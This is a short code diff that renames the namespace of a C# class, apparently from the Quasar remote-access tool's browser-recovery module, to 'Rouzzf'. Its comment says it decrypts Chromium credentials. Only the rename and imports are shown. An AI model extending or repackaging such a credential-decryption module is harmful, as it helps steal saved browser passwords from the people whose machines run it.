@@ -9,7 +9,7 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Rouzzf.Client.Recovery.Browsers
 {
     /// <summary>
     /// Provides methods to decrypt Chromium credentials.
